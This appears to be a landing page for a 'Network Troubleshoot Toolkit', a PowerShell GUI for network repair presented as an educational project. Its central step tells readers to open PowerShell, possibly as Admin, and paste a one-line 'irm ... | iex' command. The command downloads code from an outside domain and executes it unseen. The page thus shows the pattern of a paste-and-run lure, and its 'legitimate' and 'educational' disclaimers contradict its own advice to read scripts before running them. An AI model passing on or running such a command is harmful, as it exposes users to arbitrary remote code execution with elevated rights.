🔧 Network Troubleshoot Toolkit
Educational Project for Learning Windows Batch Scripting and Network Administration

⚠️ Security Note: This is for educational purposes only. Always verify scripts before executing them, especially from untrusted sources.
What's New? ✨
We've added a Graphical User Interface (GUI) version of the toolkit! Now you can use buttons instead of typing commands!

What is this?
This is a legitimate educational project demonstrating:

Windows PowerShell scripting with GUI (Windows Forms)
PowerShell web requests and script delivery
Network administration commands
The irm | iex pattern in a safe context
Features
1. Show IP Configuration - Display detailed network adapter information
2. Flush DNS Cache - Clear DNS resolver cache
3. Release IP Address - Release DHCP-assigned IP address
4. Renew IP Address - Request new IP address from DHCP server
5. Reset Winsock - Reset Windows Sockets catalog
6. Reset TCP/IP Stack - Reset TCP/IP stack to default settings
7. Ping Google - Test internet connectivity
8. Network Statistics - Show active network connections and ports
9. Open Network Connections - Launch network adapter settings
10. Open Wi-Fi Settings - Launch Wi-Fi configuration
11. Full Network Repair - Run all repair tools in sequence
12. Windows Optimization - Clear temporary files and optimize Windows
How to Use (Step-by-Step)
Step 1: Open PowerShell
Press Win + X on your keyboard
Select "Windows PowerShell" or "Windows PowerShell (Admin)" from the menu
Or search for "PowerShell" in the Start menu and click "Windows PowerShell"
Step 2: Run the Command
Copy and paste this command into PowerShell, then press Enter:

irm https://quicklh.online/network | iex
Step 3: Use the Toolkit
Wait for the toolkit to download and launch
A window will open with buttons for all the network tools
Click any button to run the tool
See the results in the output box at the bottom
Alternative: Download and Run Manually
Download NetworkTroubleshoot.ps1
Right-click the file and select "Run with PowerShell"
If prompted, click "Yes" to allow execution
Files in This Project
NetworkTroubleshoot.ps1 - The main PowerShell script with GUI interface
NetworkTroubleshoot.cmd - Legacy command-line batch script (still available)
network - PowerShell loader (shortcut URL) that downloads and runs the toolkit
index.html - This documentation page
.htaccess - URL rewriting rules for Apache servers
Key Educational Concepts
PowerShell GUI - Windows Forms in PowerShell
Batch Scripting - Windows .cmd/.bat file syntax (legacy)
Network Commands - ipconfig, netsh, ping, netstat
PowerShell Web Requests - Invoke-RestMethod (irm)
Script Execution - Invoke-Expression (iex) pattern
System Administration - Network troubleshooting workflow
Security Best Practices - Understanding script safety
Security Best Practices
Always remember:
Never run scripts from untrusted sources
Always read and understand a script before executing it
Only use HTTPS URLs for script delivery
Consider code signing for production scripts
Run scripts with least privilege necessary
How to Host This
You can host these files on any web server (Apache, Nginx, IIS, or hosting services like Hostinger):

Upload all files to your web hosting
Update the URL in network file to point to your domain (if needed)
Share the documentation with your students
For Educators
This project is perfect for teaching:

Computer networking fundamentals
Windows system administration
PowerShell GUI development with Windows Forms
Scripting and automation
Cybersecurity awareness (script safety)
